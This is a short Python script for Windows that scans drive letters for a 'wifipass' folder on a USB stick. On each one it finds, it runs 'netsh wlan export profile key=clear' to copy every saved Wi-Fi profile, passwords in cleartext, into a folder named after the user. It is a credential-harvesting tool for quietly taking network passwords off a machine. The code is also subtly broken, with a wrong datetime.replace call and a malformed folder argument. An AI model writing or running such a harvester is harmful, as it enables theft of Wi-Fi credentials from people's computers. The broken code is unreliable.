import subprocess
import os
from datetime import datetime

# Expoting wifi pass fil in usb flash

alphabet=[]
for i in range (26):
    alphabet.append(chr(65+i))
    userName=os.getlogin()
    heure=datetime.now()
    heure=str(heure.replace(':','-'))
    userName=userName+heure
    
    # parent directory
    parentDir=f"{alphabet[i]}:/wifipass/"
    # cheking if parent dir exsits
    isExist=os.path.exists(parentDir)
    
    # if parent dir exist we create a new dir nemed = users name
    if (isExist==True):
        path=os.path.join(parentDir , userName)
        os.makedirs(path , exist_ok=True)

        # exporting wifi code file
        try:
            subprocess.check_output(['netsh', 'wlan', 'export','profile', 'folder=',f"{alphabet[i]}:\\wifiPass\\{userName}",'key=clear']).decode('utf-8', errors='backslashreplace').split('\n')
        except subprocess.CalledProcessError:
            print("not export")
